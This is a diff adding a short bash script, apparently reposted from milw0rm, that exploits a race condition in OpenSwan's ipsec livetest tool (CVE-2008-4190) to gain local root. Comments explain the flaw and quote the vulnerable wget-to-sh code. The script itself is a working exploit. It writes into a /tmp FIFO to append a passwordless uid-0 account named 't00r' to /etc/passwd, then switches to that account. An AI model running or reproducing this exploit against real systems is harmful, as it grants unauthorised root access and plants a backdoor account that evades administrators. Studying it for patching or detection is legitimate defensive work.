@@ -1,0 +1,32 @@
+#!/bin/bash
+# uglyswan - OpenSwan local root exploit (CVE-2008-4190)
+#
+# description:
+# The IPSEC livetest tool in Openswan 2.4.12 and earlier, and 2.6.x through 2.6.16,
+# allows local users to overwrite arbitrary files and execute arbitrary code via a
+# symlink attack on the (1) ipseclive.conn and (2) ipsec.olts.remote.log temporary files.
+# NOTE: in many distributions and the upstream version, this tool has been disabled.
+#
+# vulnerable code:
+# wget -o /dev/null  -O /tmp/ipseclive.conn "http://192.168.0.1/olts/?leftid=$leftid&$leftrsasigkey&version=$version"
+# sh < /tmp/ipseclive.conn
+#
+# the exploit:
+# cat waits for the input from wget to the fifo and after it received it, you
+# immediately echo your command into the fifo which was empty again and viola, it
+# gets executed, because the sh binary needs a few milliseconds to get loaded,
+# it's a typical race condition.
+# 
+# problem:
+# you need to trick root to execute "ipsec livetest", and this script needs to run in background...
+#
+# I don't want no fame for this as it is ripped from Gentoo bug 238574, thanks
+#
+
+mkfifo /tmp/ipseclive.conn
+cat /tmp/ipseclive.conn
+echo 'echo t00r::0:0::/tmp:/bin/sh>>/etc/passwd' > /tmp/ipseclive.conn
+rm /tmp/ipseclive.conn
+su -l t00r
+
+# milw0rm.com [2009-07-13]
